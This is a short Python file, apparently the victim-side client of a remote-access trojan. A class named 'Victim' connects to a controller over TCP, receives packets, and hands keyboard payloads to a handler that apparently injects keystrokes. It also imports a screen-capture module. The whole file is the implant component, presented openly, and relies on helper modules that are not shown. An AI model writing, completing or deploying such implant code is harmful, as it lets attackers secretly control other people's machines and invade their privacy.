import socket
import time

from handelrs import keyboard_handelr
from handelrs.keyboard_handelr import HandelKeyboard
from protocol.protocol import HandelPacket, PacketType
from screen_mirroring.screen_capture import ScreenShare


class Victim:

    def __init__(self, server_ip, server_port):
        self.SERVER_IP = server_ip
        self.SERVER_PORT = server_port
        self.ADDR = (self.SERVER_IP, self.SERVER_PORT)
        self.victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def main(self):

        try:
            self.victim.connect(self.ADDR)
            connected = True

            while connected:
                packet_type, packet_payload = HandelPacket.recv_packet(self.victim)
                if packet_type == PacketType.KEYBOARD.value:
                    HandelKeyboard.handel(packet_payload)

            self.victim.close()
            print('done.')
        except Exception as e:
            print(e)


if __name__ == '__main__':
    Victim('127.0.0.1', 1245).main()
